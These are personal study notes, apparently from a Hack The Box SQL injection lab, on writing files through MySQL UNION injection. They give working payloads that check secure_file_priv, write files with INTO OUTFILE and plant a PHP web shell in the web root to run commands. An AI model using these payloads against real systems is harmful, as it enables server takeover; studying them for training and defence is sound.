
***
###### `Title :- Writing Files`
###### `Created on :- 2023-06-18 - 05:35`
###### `Created by:- Prem J`
***

- Writing files is much more restricted in the modern DBMSes, because it may lead to RCE. Only certain privileges for DBA's have the privilege to write files.

#### `Write File Privileges -->`

- To be able to write files to the back-end server using a MySQL database, we require three things
	1. User with `FILE` privilege enabled
	2. MySQL global `secure_file_priv` variable not enabled
	3. Write access to the location we want to write to on the back-end server

- According to the [[Reading Files]] the current user already has FILE type privileges

#### `secure_file_priv -->`

- The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from
- An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable
- On the other hand, `NULL` means we cannot read/write from any directory. **MariaDB** has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege
- However, `MySQL` uses `/var/lib/mysql-files` as the default folder.
- some modern configurations default to `NULL`. We can view the variable using

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

- However, as we are using a `UNION` injection, we have to get the value using a `SELECT`statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. `MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.
- We have to select these two columns from that table in the `INFORMATION_SCHEMA`database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the `secure_file_priv` variable, using the `WHERE` clause we learned about in a previous section.

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![[Pasted image 20230618060043.jpg]]

- it's empty stating we have access to everything.

#### `SELECT INTO OUTFILE -->`

- to write files into the back-end server we need use the  [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)statement, which is used to write data from select queries to files.

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

- upon which file gets created in the backend i.e we can find the content in `/tmp/credentials`.
- It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```shell-session
premjampuram@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

- the file was created and owned by mysql.

>[!tip]
>Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data

#### `Writing files through SQL Injection -->`

- MySQL we application is launched from /var/www/html.

>[!tip]
>To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

- The Union injection payload is 

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

![[Pasted image 20230618065447.png]]

- We don't see any errors but the file would have been written to the web root directory. Making it available to anyone who visits the site.

#### `Writing a web shell -->`

- Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:

```php
<?php system($_REQUEST[0]); ?>
```

We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

![](https://academy.hackthebox.com/storage/modules/33/write_shell.png)

- Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:

![[Pasted image 20230618070528.png]]

- The output of the `id` command confirms that we have code execution and are running as the `www-data` user.
- To run commands using php we can also do

```sql
cn' union select "",'<?php system("cat /var/www/flag.txt"); ?>',"","" into outfile '/var/www/html/shell7.php'-- 
```